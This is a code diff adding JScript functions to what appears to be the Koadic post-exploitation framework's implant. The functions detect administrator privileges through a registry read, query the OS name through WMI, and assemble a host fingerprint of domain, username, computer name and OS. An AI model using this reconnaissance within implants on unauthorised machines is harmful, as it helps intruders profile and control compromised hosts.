@@ -106,6 +106,52 @@ Koadic.isWScript = function()
     return typeof(WScript) !== "undefined";
 }
 
+Koadic.user = {};
+
+Koadic.user.isElevated = function()
+{
+    try
+    {
+    	  Koadic.WS.RegRead("HKEY_USERS\\s-1-5-19\\");
+    	  return true;
+    }
+    catch(e)
+    {
+        return false;
+    }
+}
+
+Koadic.user.OS = function()
+{
+    try
+    {
+        var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
+        var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
+
+        var enumItems = new Enumerator(colItems);
+        var objItem = enumItems.item();
+        return objItem.Caption;
+    }
+    catch(e){}
+
+    return "Unknown";
+}
+
+
+Koadic.user.info = function()
+{
+    var net = new ActiveXObject("WScript.Network");
+    var info = net.UserDomain + "\\" + net.Username;
+
+    if (Koadic.user.isElevated())
+        info += "*";
+
+    info += "~~~" + net.ComputerName;
+    info += "~~~" + Koadic.user.OS();
+
+    return info;
+}
+
 Koadic.work = {};
 
 /*
